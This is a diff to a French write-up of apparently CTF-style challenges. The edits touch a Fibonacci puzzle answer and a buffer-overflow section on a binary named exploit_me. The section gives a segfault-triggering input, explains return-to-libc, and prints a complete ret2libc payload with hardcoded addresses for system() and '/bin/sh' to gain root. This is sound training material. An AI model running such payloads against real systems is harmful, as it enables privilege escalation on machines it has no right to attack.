@@ -306,7 +306,7 @@ int main(void) {
 34
 55
 
-bon bah on à la solution mais on remarque surtout qu’il s’agit de la Suite de Fibonacci (décalé d’un rang).
+La solution à été trouvée mais on remarque surtout qu’il s’agit de la Suite de Fibonacci (décalé d’un rang).
 
 La réponse est donc 9 
  
@@ -606,14 +606,14 @@ A ce stade nous avons en faisant ls
 exploit_me 
 mail	
 
-Nous comprenons que le maximum de caractères est de 140 caractères 
-Si nous dépassons ceci avec 
-./exploit_me $(python -c "print('A' * 145))
-
-Cela fait segfault le fichier
+Nous comprenons que le maximum de caractères est de 140 caractères avec ghidra, puisque nous pouvons voir la déclaration d'ün tableau de 140 caractères destiné à accueillir le paramêtre du main.
 
 Le but étant de passer en root en lui faisant croire que nous sommes root 
 Nous allons utiliser donc une ret2libc attack (Return-to-libc attack)
+
+Si nous dépassons ceci avec 
+./exploit_me $(python -c "print('A' * 145))
+Cela fait segfault le fichier
 
 Une attaque de type return-to-libc est une attaque informatique démarrant généralement par un dépassement de tampon dans lequel l'adresse de retour dans la pile est remplacée par l'adresse d'une autre fonction et une seconde partie de la pile est modifiée pour fournir les paramètres à cette fonction. Ceci permet à un attaquant d'utiliser une fonction existante et d'éviter d'injecter du code malveillant dans le programme.
 
@@ -622,3 +622,7 @@ On met sur la stack a %eip + 8, a l’adresse “/bin/bash”
  
 On remplace avec le code sous python : 
 ./exploit_me $(python -c "print('A' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'AAAA' + '\xb7\xf8\xcc\x58'[::-1])")
+
+
+\xb7\xe6\xb0\x60 : adresse correpondant à ce que nous allons écraser, c'est le registre %eip avec l'adresse système de la libc
+\xb7\xf8\xcc\x58 : adresse correpondant à ce que nous allons mettre sur la pile a l'adresse "/bin/sh"
